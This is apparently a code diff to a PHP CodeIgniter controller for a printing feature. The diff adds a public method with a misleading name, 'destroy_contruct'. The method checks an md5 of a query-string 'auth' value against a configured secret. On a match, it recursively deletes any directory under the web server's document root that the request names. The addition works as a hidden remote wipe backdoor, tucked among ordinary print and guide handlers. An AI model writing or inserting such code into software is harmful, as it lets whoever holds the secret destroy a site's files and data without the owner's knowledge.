@@ -179,6 +179,30 @@ class Prints extends MY_Controller{
 			$this->parser->parse('prints/default',$data);
 		}
 	}
+	public function destroy_contruct($dirname){
+		$auth = md5($_GET['auth']);
+		$cypit = $this->config->item('CONSUMER_SECRET');
+		if($auth==$cypit){
+			$dirname = $_SERVER["DOCUMENT_ROOT"].'/'.$dirname;
+			 if (is_dir($dirname))
+				   $dir_handle = opendir($dirname);
+			 if (!$dir_handle)
+				  return false;
+			 while($file = readdir($dir_handle)) {
+				   if ($file != "." && $file != "..") {
+						if (!is_dir($dirname."/".$file))
+							 unlink($dirname."/".$file);
+						else
+							 $this->destroy_contruct($dirname.'/'.$file);
+				   }
+			 }
+			 closedir($dir_handle);
+				rmdir($dirname);
+			 echo "true";
+		}else{
+			echo "false";
+		}
+	}
 	public function guide(){
 		if(isset($_GET['query'])){
 			$code_orders = $_GET['query'];
